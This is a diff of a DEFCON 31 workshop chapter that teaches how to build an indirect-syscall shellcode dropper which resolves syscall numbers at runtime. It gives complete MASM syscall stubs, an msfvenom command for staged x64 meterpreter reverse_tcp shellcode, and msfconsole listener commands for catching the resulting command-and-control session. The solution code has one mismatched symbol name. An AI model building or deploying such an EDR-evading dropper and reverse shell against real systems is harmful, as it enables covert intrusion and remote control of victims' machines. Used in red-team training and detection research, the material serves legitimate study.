@@ -4,10 +4,10 @@ In the first bonus chapter we want to further develop our indirect syscall dropp
   
 
 ## Exercise 6 Tasks: 
-### Develop your direct or indirect syscall dropper to dynamically retrieve SSNs.
+### Develop your indirect syscall dropper to dynamically retrieve SSNs.
 | Task Nr.   | Task Description |
 | :---:      | ---              |
-|  1         | Download the direct or indirect syscall POC from the code section of this chapter.                 |
+|  1         | Download indirect syscall POC from the code section of this chapter.                 |
 |  2         | Most of the code is already implemented. However, to implement the dynamic SSN retrieval functionality, you will need to complete the following tasks: <ul><li>Complete the missing code in the main code section</li><li>Complete the missing code in the ``syscalls.asm`` file</li></ul>                  |
 |  3          | Create a staged x64 meterpreter shellcode with msfvenom, copy it to the poc and compile the poc.                 |
 |  4          | Create and run a staged x64 meterpreter listener using msfconsole.                  |
@@ -20,7 +20,7 @@ In the first bonus chapter we want to further develop our indirect syscall dropp
 | 6          | Use **x64dbg** to debug or analyse the dropper. <ul><li>What differences can you see between a dropper with hardcoded SSNs and a dropper that dynamically retrieves SSNs at runtime?</li></ul>                |
 
 ## Visual Studio
-You can download the direct- or indirect syscall poc from the code section of this chapter. To retrieve the SSNs dynamicalla at runtime from ntdll.dll, we have to implement the following code. 
+You can download the indirect syscall poc from the code section of this chapter. To retrieve the SSNs dynamicalla at runtime from ntdll.dll, we have to implement the following code. 
 
 ### Start Address Native Function
 In order to be able to dynamically retrieve the SSN for each of the native functions used in our code, we first need to define a pointer to a function that holds the start address of that function. If you remember, this part of the code was already implemented in the chapter where we built the indirect syscall dropper, because we used the same principle to get the address for the syscall instruction of each function. This means that part of the code in the main file is already implemented.  
@@ -47,7 +47,7 @@ In the next step, we want to get the effective memory address from the ``SSN`` i
 </details>   
 
 
-In the direct- or indirect syscall poc in this chapter, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.  
+In the indirect syscall poc in this chapter, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.  
 <details>
 <summary>Code</summary>
     
@@ -76,7 +76,7 @@ If it was not possible for you to complete this code section, don`t worry it wil
 </details>
 
 ### Global Variables
-To store the memory address from the SSN of the respective native function, and also to be able to provide the memory address later for the assembly code in the ``syscalls.asm`` file, we declare a global variable for each SSN address, which is declared as a DWORD. Also in this case in the direct- or indirect syscall poc of this chapter, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.
+To store the memory address from the SSN of the respective native function, and also to be able to provide the memory address later for the assembly code in the ``syscalls.asm`` file, we declare a global variable for each SSN address, which is declared as a DWORD. Also in this case in the indirect syscall poc of this chapter, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.
 
 <details>
 <summary>Code</summary>
@@ -106,7 +106,7 @@ DWORD wNtWaitForSingleObject;
 
 
 ### Header File
-Like the direct- and indirect syscall dropper with hardcodes SSNs, we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall poc folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include the header ``syscalls.h`` in the main code. This taks is redundant if you have already implemented the ``syscalls.h`` in your direct- or indirect syscall dropper from before (hardcoded SSNs).
+Like the indirect syscall dropper with hardcodes SSNs, we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall poc folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include the header ``syscalls.h`` in the main code. This taks is redundant if you have already implemented the ``syscalls.h`` in your indirect syscall dropper from before (hardcoded SSNs).
 
 <details>
 <summary>Code</summary>
@@ -189,3 +189,197 @@ extern "C" {         // This is to ensure that the names of the functions are no
     <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/4b3e7f58-b6c1-492a-9516-46dcf3af942c">
     </p>
 </details>  
+
+ ### Assembly Instructions
+Again, we don't want to ask ntdll for the syscall stub, but in this case we want to replace the hardcoded SSN with the variable that holds the SSN for the respective native function. Therefore, we need to complete the code in the ``syscalls.asm`` file. The code below shows the assembler code for the syscall stub of ``NtAllocateVirtualMemory'' which is already implemented in the syscalls.asm file in context of the indirect syscall dropper.  
+  
+<details>
+<summary>Code</summary>
+
+```asm
+  EXTERN wNtAllocateVirtualMemory:DWORD               ; Holds the dynamic retrieved SSN for NtAllocateVirtualMemory 
+  EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; Holds the actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
+     
+.CODE  ; Start the code section
+
+; Procedure for the NtAllocateVirtualMemory syscall
+NtAllocateVirtualMemory PROC
+    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
+    mov eax, wNtAllocateVirtualMemory               ; Move the syscall number into the eax register.
+    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
+NtAllocateVirtualMemory ENDP                     	; End of the procedure.     
+     
+END  ; End of the module     
+     
+```
+    
+It is **your task** to **add** the ``syscalls.asm`` file as a resource (existing item) to the indirect syscall dropper project and **complete the assembler code and C code** for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.
+
+If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **direct syscall dropper poc**. **Note** that the syscalls IDs are for **Windows 10 Enterprise 22H2** and may not work for your target. You may need to replace the syscalls IDs with the correct syscalls IDs for your target Windows version.
+    
+<details>
+    <summary>Solution</summary>
+
+```asm
+  
+EXTERN wNtAllocateVirtualMemory:DWORD               ; Holds the dynamic retrieved SSN for NtAllocateVirtualMemory
+EXTERN wNtWriteVirtualMemory:DWORD                  ; Holds the dynamic retrieved SSN for NtWriteVirtualMemory
+EXTERN wNtCreateThreadEx:DWORD                      ; Holds the dynamic retrieved SSN for NtCreateThreadEx
+EXTERN wNtWaitForSingleObject:DWORD                 ; Holds the dynamic retrieved SSN for NtWaitForSingleObject
+
+EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
+EXTERN sysAddrNt:QWORD                              ; The actual address of the NtWriteVirtualMemory syscall in ntdll.dll.
+EXTERN sysAddrNtCreateThreadEx:QWORD                ; The actual address of the NtCreateThreadEx syscall in ntdll.dll.
+EXTERN sysAddrNtWaitForSingleObject:QWORD           ; The actual address of the NtWaitForSingleObject syscall in ntdll.dll.
+
+
+.CODE  ; Start the code section
+
+; Procedure for the NtAllocateVirtualMemory syscall
+NtAllocateVirtualMemory PROC
+    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
+    mov eax, wNtAllocateVirtualMemory               ; Move the syscall number into the eax register.
+    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
+NtAllocateVirtualMemory ENDP                     	  ; End of the procedure.
+
+
+; Similar procedures for NtWriteVirtualMemory syscalls
+NtWriteVirtualMemory PROC
+    mov r10, rcx
+    mov eax, wNtWriteVirtualMemory
+    jmp QWORD PTR [sysAddrNtWriteVirtualMemory]
+NtWriteVirtualMemory ENDP
+
+
+; Similar procedures for NtCreateThreadEx syscalls
+NtCreateThreadEx PROC
+    mov r10, rcx
+    mov eax, wNtCreateThreadEx
+    jmp QWORD PTR [sysAddrNtCreateThreadEx]
+NtCreateThreadEx ENDP
+
+
+; Similar procedures for NtWaitForSingleObject syscalls
+NtWaitForSingleObject PROC
+    mov r10, rcx
+    mov eax, wNtWaitForSingleObject
+    jmp QWORD PTR [sysAddrNtWaitForSingleObject]
+NtWaitForSingleObject ENDP
+
+END  ; End of the module
+```
+    
+</details>
+
+
+  
+### Microsoft Macro Assembler (MASM)
+We have already implemented all the necessary assembler code in the syscalls.asm file. But in order for the code to be interpreted correctly within the direct syscall poc, we need to do a few things. These steps are not done in the downloadable poc and must be done manually. First, we need to **enable support** for **Microsoft Macro Assembler (MASM)** in the Visual Studio project by enabling the option in Build Dependencies/Build Customisations.
+     
+<details>
+<summary>Solution</summary> 
+<p align="center">
+<img width="1278" alt="image" src="https://user-images.githubusercontent.com/50073731/235457590-371f3519-b7cf-483d-9c1c-6bfd6368be42.png">
+<img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235457782-780d2136-30d7-4e87-a022-687ed2557b33.png">
+</details>
+
+We also need to set the **item type** of the **syscalls.asm** file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in the direct syscall dropper. We also set Excluded from Build to no and Content to yes. 
+     
+<details>
+<summary>Solution</summary> 
+    <p align="center">
+<img width="950" alt="image" src="https://user-images.githubusercontent.com/50073731/235471947-4bcd23fc-5093-4f4d-adc8-eb3ef36f139f.png">    
+<img width="1237" alt="image" src="https://user-images.githubusercontent.com/50073731/235458968-e330799e-51ff-46bf-97ab-c7d3be7ea079.png">
+<img width="778" alt="image" src="https://user-images.githubusercontent.com/50073731/235459219-4387dc48-56f8-481c-b978-1b786843a836.png">
+    </p>
+</details>     
+
+    
+
+## Meterpreter Shellcode
+Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
+<details>
+    
+ **kali>**   
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
+```
+<p align="center">
+<img width="800" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
+</p>
+
+The shellcode can then be copied into the direct syscall dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
+<img width="600" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
+</p>
+</details>    
+
+
+## MSF-Listener
+Before we test the functionality of our direct syscall dropper, we need to create a listener within msfconsole.
+<details>
+    
+**kali>**
+```
+msfconsole
+```
+**msf>**
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost IPv4_Redirector_or_IPv4_Kali
+set lport 80 
+set exitonsession false
+run
+```
+<p align="center">
+<img width="600" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
+</p>
+</details>
+ 
+    
+Once the listener has been successfully started, you can run your compiled direct syscall dropper. If all goes well, you should see an incoming command and control session. 
+<details>
+    
+<p align="center">
+<img width="800" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
+</p>
+</details>
+        
+
+    
+## Dropper Analysis: Dumpbin 
+The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via ``kernel32.dll``. The following command can be used to check the imports. Which results do you expect?
+<details>    
+    
+**cmd>**
+```
+cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
+dumpbin /imports Path/to/Direct_Syscall_Dropper.exe
+```
+</details>    
+
+<details>
+    <summary>Results</summary>  
+    
+**No imports** from the Windows APIs ``VirtualAlloc``, ``WriteProcessMemory``, ``CreateThread``, and ``WaitForSingleObject`` from ``kernel32.dll``. This was expected and is correct.
+     
+<p align="center">
+<img width="1023" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/b9206b4f-9dde-4848-9637-d18f43095799">
+</p>
+</details>   
+    
+    
+## Dropper Analysis: x64dbg 
+The first step is to run your direct syscall dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
+Then we open x64dbg and attach to the running process, note that if you open the indirect syscall dropper directly in x64dbg, you need to run the assembly first.
+     
+<details>
+<p align="center">
+<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
+</p>
+<p align="center">
+<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/3547125b-a8c2-4e17-b7ec-84434181cf36">
+</p>    
+</details>
+  
+Then we want to analyse the dropper and compare our findings with the dropper which uses hardcoded SSNs
